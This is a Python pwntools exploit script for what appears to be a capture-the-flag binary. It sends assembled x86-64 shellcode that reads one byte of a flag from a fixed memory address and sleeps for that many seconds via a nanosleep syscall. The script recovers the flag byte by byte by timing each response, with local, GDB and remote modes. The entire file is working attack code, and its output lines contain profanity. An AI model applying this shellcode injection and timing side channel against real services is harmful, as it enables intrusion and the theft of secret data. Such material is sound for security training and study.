#!/usr/bin/python3

from pwn import *
import time



context.terminal = ["tmux", "split-window", "-vf"]
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./run"        ### CHANGE ME !!!!!!!!!!!!!!!!


gdbscript = """
    break *main+103
"""

flag_addr = 0x4040c0
flag = b""
inc = 0

while (True):
    pp = None
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)
    elf = context.binary = ELF(binary)

# basically move a char of the flag in 
# then get a char out of it
# sleep its amount 
# exit
    payload = asm(
                "xor rax, rax;"
                f"mov esi, {flag_addr + inc};"
                "lodsb;"
                "mov [rbp], rax;"
                "xor rsi, rsi;"
                "mov [rbp + 8], rsi;"
                "mov al, 35;"
                "mov rdi, rbp;"
                "syscall;"
                  )

    log.info("binary loaded")
    pp.recvuntil(b">> ")
    pp.sendline(payload)
    t = time.time()

    try : 
        pp.recvuntil(b"lol")
    except :
        val = int(time.time() - t)
        if (chr(val) == '\n'):
            break;
        flag += chr(val).encode()
        print(f"Fucking flag {flag}")
    inc += 1

print(f"here's your fucking flag {flag}")
